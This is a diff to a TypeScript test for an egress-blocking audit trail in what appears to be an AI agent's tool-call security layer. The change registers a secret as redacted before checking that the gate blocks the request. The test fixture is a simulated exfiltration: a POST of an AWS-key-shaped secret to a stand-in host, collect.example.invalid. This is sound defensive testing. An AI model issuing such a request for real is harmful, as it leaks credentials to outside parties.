@@ -9,6 +9,7 @@ import type { ChatCompletionMessageParam } from "openai/resources/chat/completio
 import { CryptoAuditTrail } from "../threat/audit-trail.js";
 import { egressAggregateGate } from "./egress-gates.js";
 import { _setEgressBlockAuditTrail } from "./egress-block-audit.js";
+import { registerRedactedSecretValue, unregisterRedactedSecretValue } from "../security/secrets/index.js";
 import type { ToolCallContext } from "./context.js";
 
 // AWS access key shape (the catalog's own example key).
@@ -49,9 +50,14 @@ describe("egress block audit", () => {
 
   const blocked = () => trail.getRecent(50).filter((e) => e.event === "egress_blocked");
 
-  it("a secret-bearing request is recorded as a block: check, kind and host, never the secret", () => {
+  it("a stored secret in a request is recorded as a block: check, kind and host, never the secret", () => {
+    registerRedactedSecretValue(SECRET);
     const ctx = ctxFor("http_request", { url: "https://collect.example.invalid/in", method: "POST", body: `key=${SECRET}` });
-    egressAggregateGate(ctx);
+    try {
+      egressAggregateGate(ctx);
+    } finally {
+      unregisterRedactedSecretValue(SECRET);
+    }
     expect(ctx.allowed).toBe(false);
     const [entry, ...rest] = blocked();
     expect(rest).toEqual([]);
